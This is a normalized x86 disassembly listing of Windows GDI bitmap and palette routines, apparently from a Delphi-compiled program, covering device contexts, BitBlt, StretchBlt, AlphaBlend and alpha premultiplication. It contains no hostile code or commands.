call sub_448d2c
call sub_448d2c
jmp r-xdata
sub_470db1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectW
sub_470dc0
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_448ca8
call sub_448cfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectW
sub_470e20
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectW
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
movzx eax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_470e84
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectW
test eax eax
je r-xdata
mov eax ebx
call sub_470348
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_47107f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_46ecc0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_46ecc0
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_46ecc0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_471037
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_4707bc
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_471090
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_46fe44
mov [ edi + 0x34 ] 0x20000000
mov [ edi + 0x39 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_4705e0
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4710fc
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_471d1c
mov eax [ esi + 0x28 ]
call sub_4705e4
mov eax [ esi + 0x2c ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_471138
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_471d1c
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_471215
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_447ae4
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_471f8c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_4705e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4705e4
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
movzx eax [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
movzx eax [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
mov eax esi
call sub_471a94
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_472a14
movzx eax [ esi + 0x39 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x39 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424dc0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_47124c
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_471d1c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4712dc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_470e20
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4707bc
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x71 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471f8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4712e1
mov eax [ ebp - 0x8 ]
call sub_46c288
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_448ca8
call sub_448cfc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_47130c
push ebx
mov ebx eax
mov eax ebx
call sub_471928
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
pop ebx
retn
sub_471344
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_4272f8
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_471d1c
lea eax [ ebx + 0x2c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
push esp
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x71 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_471f8c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4713c0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_46e9a4
mov eax ebx
call sub_471e2c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_471a64
test al al
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_471657
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_46e8c8
push eax
call SetStretchBltMode
mov eax ebx
call sub_4719a8
movzx edx [ r-xdata ]
call sub_46e9a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
mov eax ebx
call sub_471dcc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_471593
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_46ecc0
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4719a8
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_46ee70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4719a8
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1f ] 0x0
mov [ ebp - 0x1e ] 0xff
mov [ ebp - 0x1d ] 0x1
push [ ebp - 0x20 ]
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4719a8
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
call sub_46e8c8
push eax
call AlphaBlend
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47165e
cmp [ ebp - 0x9 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_471669
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_46e9a4
mov eax ebx
call sub_471e2c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_471a64
test al al
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_471913
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_46e8c8
push eax
call SetStretchBltMode
mov eax ebx
call sub_4719a8
movzx edx [ r-xdata ]
call sub_46e9a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
mov eax ebx
call sub_471dcc
cmp [ esi + 0x3e ] 0x20
jne r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_47183f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_46ecc0
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4719a8
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_46ee70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1f ] 0x0
movzx eax [ ebp + 0x8 ]
mov [ ebp - 0x1e ] al
mov [ ebp - 0x1d ] 0x0
push [ ebp - 0x20 ]
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4719a8
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
call sub_46e8c8
push eax
call AlphaBlend
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1f ] 0x0
movzx eax [ ebp + 0x8 ]
mov [ ebp - 0x1e ] al
mov [ ebp - 0x1d ] 0x1
push [ ebp - 0x20 ]
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4719a8
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
call sub_46e8c8
push eax
call AlphaBlend
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47191a
sub_47181c
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_471928
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_471d2c
cmp [ ebx + 0x70 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_47124c
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_46ec18
sub_4719a8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_471d2c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4703c4
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_47130c
sub_4719f0
push ebx
mov ebx eax
mov eax ebx
call sub_471d1c
mov eax ebx
call sub_471d2c
mov edx ebx
mov eax ebx
call sub_47130c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_471a14
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_471a94
push ebx
push esi
mov esi eax
mov bl 0x8
mov eax esi
call sub_471a14
cmp al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
lea edx [ eax + 0x18 ]
lea eax [ edx + 0x18 ]
movzx ecx [ eax + 0xe ]
cmp ecx 0x10
jg r-xdata
xor ebx ebx
jmp r-xdata
sub ecx 0x18
je r-xdata
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x6
jmp r-xdata
sub ecx 0x8
je r-xdata
mov eax [ eax + 0x10 ]
sub eax 0x1
jb r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov bl 0x4
jmp r-xdata
sub eax 0x2
je r-xdata
mov bl 0x1
jmp r-xdata
sub ecx 0x3
je r-xdata
mov bl 0x7
cmp [ edx + 0x44 ] 0x7e0
jne r-xdata
jmp r-xdata
mov bl 0x2
jmp r-xdata
sub ecx 0x4
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x3
jmp r-xdata
jmp r-xdata
sub_471b34
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ esi + 0x28 ]
cmp [ eax + 0x3e ] 0x20
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ eax + 0x2c ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ebp [ esi + 0x28 ]
mov eax [ ebp + 0x2c ]
add eax [ ebp + 0x44 ]
mov ebx ecx
cmp eax ebx
ja r-xdata
movzx eax [ ecx ]
mov edi ebx
add edi 0x3
movzx edx [ edi ]
imul edx
mov ebp 0xff
xor edx edx
div ebp
mov [ ecx ] al
mov eax ebx
inc eax
movzx eax [ eax ]
movzx edx [ edi ]
imul edx
mov ebp 0xff
xor edx edx
div ebp
mov edx ecx
inc edx
mov [ edx ] al
add ebx 0x2
movzx eax [ ebx ]
movzx edx [ edi ]
imul edx
mov ebx 0xff
xor edx edx
div ebx
mov edx ecx
add edx 0x2
mov [ edx ] al
add ecx 0x4
sub_471bb0
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ esi + 0x28 ]
cmp [ eax + 0x3e ] 0x20
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ eax + 0x2c ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edi [ esi + 0x28 ]
mov eax [ edi + 0x2c ]
add eax [ edi + 0x44 ]
mov ebx ecx
cmp eax ebx
ja r-xdata
mov ebp ebx
add ebp 0x3
cmp [ ebp ] 0x0
jne r-xdata
movzx eax [ ecx ]
mov edx eax
shl eax 0x8
sub eax edx
mov edx ecx
add edx 0x3
movzx edx [ edx ]
mov edi edx
xor edx edx
div edi
mov [ ecx ] al
lea eax [ ecx + 0x1 ]
movzx eax [ eax ]
mov edx eax
shl eax 0x8
sub eax edx
movzx edx [ ebp ]
mov edi edx
xor edx edx
div edi
mov edx ebx
inc edx
mov [ edx ] al
lea eax [ ecx + 0x2 ]
movzx eax [ eax ]
mov edx eax
shl eax 0x8
sub eax edx
movzx edx [ ebp ]
mov edi edx
xor edx edx
div edi
add ebx 0x2
mov [ ebx ] al
mov [ ecx ] 0x0
mov eax ebx
inc eax
mov [ eax ] 0x0
add ebx 0x2
mov [ ebx ] 0x0
jmp r-xdata
add ecx 0x4
sub_471c58
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_46cf24
mov eax ebx
call sub_471a64
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
dec eax
push eax
mov eax ebx
call sub_4719a8
xor edx edx
pop ecx
call sub_46e854
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_471ca8
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_471e2c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4707bc
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectW
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
movzx ecx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_471d2c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_427294
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_471daf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_471dcc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
